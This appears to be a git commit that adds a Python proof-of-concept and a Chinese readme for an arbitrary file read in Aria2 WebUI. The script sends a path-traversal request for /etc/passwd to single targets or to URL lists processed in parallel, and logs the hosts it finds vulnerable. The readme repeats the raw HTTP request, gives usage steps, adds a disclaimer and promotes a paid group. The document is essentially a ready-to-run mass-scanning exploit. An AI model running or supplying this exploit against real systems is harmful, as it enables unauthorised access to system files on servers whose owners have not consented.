843ee32bf1fbf8593e9af9124d7fce76a1bfa9b2
Y1_K1NG <1146426788@qq.com>
2024-01-29 11:28:59 +0800

    20240128

---
+++ 20240128Aria2 WebUI文件读取/poc.py
@@ -0,0 +1,118 @@
+# -*- coding: utf-8 -*-
+import argparse
+import base64
+import re
+import sys
+import json
+from multiprocessing.dummy import Pool
+
+import requests
+import urllib3
+from rich.console import Console
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+def banner():
+    test = """
+           8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
+            Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
+             Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
+              "8aa8"      88           88,d88'      88 88  `8b   88 88             
+               `88'       88           8888"88,     88 88   `8b  88 88      88888  
+                88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
+                88        88           88     "88,  88 88     `888   `"Y88888P"   
+
+                            888888888888 
+
+                                        tag: this is a Aria2 WebUI文件读取
+                                              @version: 1.0.0   @author: Y1_K1NG           
+    """
+    print(test)
+
+
+def poc(target):
+    if target[-1] == '/':
+        target = target[:-1]
+    else:
+        target = target
+    url = target + "/../../../../etc/passwd"
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
+        "Accept-Encoding": "gzip, deflate",
+        "Connection": "close",
+        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8"
+
+    }
+
+
+    try:
+        response1 = requests.get(url, headers=headers, verify=False, timeout=15)
+        # print(response1.text)
+        if response1.status_code != "200" and "root" in response1.text:
+            print(f"[++++++] {target} 存在 任意文件读取")
+            with open("result.txt", "a+", encoding="utf-8") as f:
+                f.write(target + "\n")
+
+        else:
+            print(f"[-] {target} 请求error")
+    except Exception as e:
+        print(f"[*] {target} error: {str(e)}")
+
+
+def extract_host(url):
+    """
+    从 URL 中提取主机地址和端口号，返回 (host, port)
+    """
+    match = re.search(r"(http://|https://)?([\w\.]+):?(\d+)?", url)
+    if match:
+        prefix, host, port = match.groups()
+        if not port:
+            if prefix and "https" in prefix:
+                port = "443"
+            else:
+                port = "80"
+        return host, int(port)
+    else:
+        return None, None
+
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='任何问题+V y1k1ng1227')
+    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
+    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
+    args = parser.parse_args()
+
+    if args.url and not args.file:
+        if "https://" in args.url or "http://" in args.url:
+            url = args.url
+        else:
+            host, port = extract_host(args.url)
+            url = f"http://{host}:{port}"
+        poc(url)
+
+    elif args.url is None and args.file is not None:
+        url_list = []
+        with open(args.file, "r", encoding="utf-8") as f:
+            for url in f.readlines():
+                url = url.strip().replace("\n", "")
+                if "https://" in url or "http://" in url:
+                    url = url
+                else:
+                    host, port = extract_host(url)
+                    url = f"http://{host}:{port}"
+                url_list.append(url)
+
+        pool = Pool(10)
+        pool.map(poc, url_list)
+        pool.close()
+        pool.join()
+
+    else:
+        parser.print_help()
+
+
+if __name__ == '__main__':
+    main()
---
+++ 20240128Aria2 WebUI文件读取/readme.md
@@ -0,0 +1,27 @@
+# Aria2 WebUI文件读取
+
+免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与作者无关。该文章仅供学习用途使用！！！
+
+GET /../../../../etc/passwd HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Connection: close
+
+批量poc(记得安装库)
+
+python poc.py -u 
+
+python poc.py -f  .txt
+
+结果保存至result.txt
+
+
+
+## 入圈（限时体验）
+
+![image-20240127122138808](assets/image-20240127122138808.png)
+
+![image-20240121123620660](assets/image-20240121123620660.png)s
+
